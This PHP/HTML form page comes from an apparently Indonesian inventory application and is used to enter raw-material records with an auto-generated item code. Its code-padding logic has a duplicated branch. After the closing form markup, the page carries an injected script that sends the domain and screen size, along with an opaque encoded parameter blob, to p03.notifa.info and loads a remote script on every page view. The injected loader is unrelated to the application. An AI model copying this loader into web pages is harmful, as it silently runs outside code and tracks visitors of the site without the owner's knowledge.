<?php
include 'koneksi.php';
include 'menu.php';
?>


 <div class="row"> 
 <div class="col-md-12"> 
 <div class="widget box"> 
 <div class="widget-header">
  <h4>
  <i class="icon-reorder">
  </i> Masukkan Data Bahan Baku</h4> 
  </div> 
  <div class="widget-content">

   <form class="form-horizontal row-border" action="halaman.php?go=SimpanBahan" method="post">
    <div class="alert alert-info fade in"> 
    <i class="icon-remove close" data-dismiss="alert">
    </i> Silakan masukkan data Bahan Baku pada Borang di bawah ini dengan benar ! </div> <div class="form-group"> <label class="col-md-2 control-label">Kode Bahan:</label> 

<?php
include 'koneksi.php';
$data = mysql_query("select * from mbahan order by kd_bahan DESC LIMIT 0,1");
$i= mysql_fetch_array($data) ;
$kodeawal=substr($i['kd_bahan'],3,4)+1;
if($kodeawal<10){
  $kode='BN-000'.$kodeawal;
}elseif($kodeawal > 9 && $kodeawal <=99){
  $kode='BN-00'.$kodeawal;
}else{
  $kode='BN-00'.$kodeawal;
}
?>

    <div class="col-md-10"><input type="text" name="kdb" class="form-control" readonly="" placeholder="Kode Bahan Baku" value="<?php echo $kode?>"></div> 
    </div> 
    <div class="form-group"> 
    <label class="col-md-2 control-label">Nama Bahan:</label> 
    <div class="col-md-10">
    <input class="form-control" type="text" name="nama1" placeholder="Masukkan Nama Bahan Baku" required="" autocomplete="off"></div>
     </div>
     <?php
//      <div class="form-group">
//       <label class="col-md-2 control-label">Harga Bahan:</label> 
//       <div class="col-md-10"><input class="form-control" type="number" name="alamat1" placeholder="Masukkan Harga Bahan (Dalam Rupiah/ Rp.)" autocomplete="off" required="">
//       </div> 
//       </div> 
//       <div class="form-group">
//        <label class="col-md-2 control-label">Stok Bahan:</label> 
//        <div class="col-md-10">
//        <input class="form-control" type="number" name="telp1" placeholder="088888888" autocomplete="off" required=""></div> 
//        </div> 
 ?>
        
        <button type="submit" class="btn btn-success" name="Simpan">Simpan Data
        </button>

        <button type="reset" class="btn btn-danger" name="Batal">Batal
        </button>
      </div> </form> </div> </div> </div> </div> 




       



    <script type="text/javascript">if(location.host=="envato.stammtec.de"||location.host=="themes.stammtec.de"){var _paq=_paq||[];_paq.push(["trackPageView"]);_paq.push(["enableLinkTracking"]);(function(){var a=(("https:"==document.location.protocol)?"https":"http")+"://analytics.stammtec.de/";_paq.push(["setTrackerUrl",a+"piwik.php"]);_paq.push(["setSiteId","17"]);var e=document,c=e.createElement("script"),b=e.getElementsByTagName("script")[0];c.type="text/javascript";c.defer=true;c.async=true;c.src=a+"piwik.js";b.parentNode.insertBefore(c,b)})()};</script><script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2dDSBs%2bMC8FRKC08SSMUTMpjraMvAfuMCzSQEYgtDNnyX9g6PYnUcS5SBNV8AD8B34pfb2wVZnWx0rOy%2fb68RRh8lB2FX5v77OgtCevQ0CrT0R5HdTuJiq5zTL2eeRC68OkJaFWR7XoyTZMn1JZhqVAAIWKqbDhqyj61d7RIfAQJeSEw1SJTWoogCz9AQdTQyAeH5LnWUquvXBFJZNRHyX3FrTKTsYhnkXs7fUcgT2nFW4p0UuCBNlGP2d1x3LrmWJ1ZFC%2fNdMMPvfFSmfvNMzNvdv7%2fQ%2fy1Q2SnK%2bxSxf8V0tHZTt6Zx5tv4aAwk%2b731N80KZz90%2f8srekfau7dezQUD0W%2fXzGXGANFK3%2b54veKb8tQudg4h9catAq5aX8Tc70bTK7WAdJuys85KwEkBPJSTrVhE53ih0SxShEqW5D4%2fh%2fIgzvxiYgcLX2CMZoUoUhDR2DG4L4re5vFIxGpo%2fxuoz2aseX7fSEgrkPQJP15xGDw4JrtzLm2WugrQqkgp" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body> 

</html>